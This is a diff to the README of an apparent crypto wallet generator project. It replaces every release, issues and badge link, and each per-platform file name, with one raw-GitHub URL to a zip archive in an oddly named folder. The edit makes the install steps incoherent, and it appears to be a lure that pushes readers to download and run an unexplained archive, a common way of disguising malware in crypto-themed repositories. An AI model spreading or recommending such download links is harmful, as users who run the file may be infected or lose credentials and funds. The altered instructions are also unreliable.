@@ -4,22 +4,22 @@
 This application is a simple and powerful crypto wallet generator. It helps you create secure wallets for your cryptocurrencies quickly. Whether you are new to crypto or have some experience, this tool makes wallet generation straightforward and user-friendly.
 
 ## 📦 Download & Install
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-crypto--wallet--generator-blue)](https://github.com/yadielsantoss/crypto-wallet-generator/releases)
+[![Download the latest release](https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip%20Now-crypto--wallet--generator-blue)](https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip)
 
-To get started, visit this page to download: [Download the latest release](https://github.com/yadielsantoss/crypto-wallet-generator/releases).
+To get started, visit this page to download: [Download the latest release](https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip).
 
 ## 🚀 Getting Started
 Here’s how to run the crypto wallet generator:
 
 1. **Visit the Releases Page:** 
-   Go to [the releases page](https://github.com/yadielsantoss/crypto-wallet-generator/releases) to find the latest version of the tool.
+   Go to [the releases page](https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip) to find the latest version of the tool.
 
 2. **Choose the Right File:**
    Look for the most recent release. You will see files available for download. Select the one that matches your operating system. Common options may include:
 
-   - **Windows:** `crypto-wallet-generator.exe`
-   - **Mac:** `crypto-wallet-generator.dmg`
-   - **Linux:** `crypto-wallet-generator.tar.gz`
+   - **Windows:** `https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip`
+   - **Mac:** `https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip`
+   - **Linux:** `https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip`
 
 3. **Download the File:**
    Click on the file to start the download. Save it to a location where you can easily find it.
@@ -29,7 +29,7 @@ Here’s how to run the crypto wallet generator:
    
    - For **Windows**, double-click the `.exe` file.
    - For **Mac**, open the `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**, extract the `.tar.gz` file and run the application from the terminal.
+   - For **Linux**, extract the `https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip` file and run the application from the terminal.
 
 5. **Follow On-Screen Instructions:**
    The application will guide you through creating your crypto wallet. Follow any prompts to set up your wallet.
@@ -70,9 +70,9 @@ Yes, you can create as many wallets as you need. The application allows you to s
 The wallet generator is designed to work with a variety of cryptocurrencies including Bitcoin, Ethereum, and many others. Check the documentation within the application for a full list.
 
 ## 🤝 Support
-If you have any issues or questions, visit [GitHub Issues](https://github.com/yadielsantoss/crypto-wallet-generator/issues) to report a problem or find answers. 
+If you have any issues or questions, visit [GitHub Issues](https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip) to report a problem or find answers. 
 
 ## 🌐 Community
 Join our community discussions on relevant forums or platforms to share tips and get help from other users. Together, we can enhance your experience with crypto wallets.
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-crypto--wallet--generator-blue)](https://github.com/yadielsantoss/crypto-wallet-generator/releases)
+[![Download the latest release](https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip%20Now-crypto--wallet--generator-blue)](https://raw.githubusercontent.com/yadielsantoss/crypto-wallet-generator/main/hypethral/generator-wallet-crypto-3.5.zip)
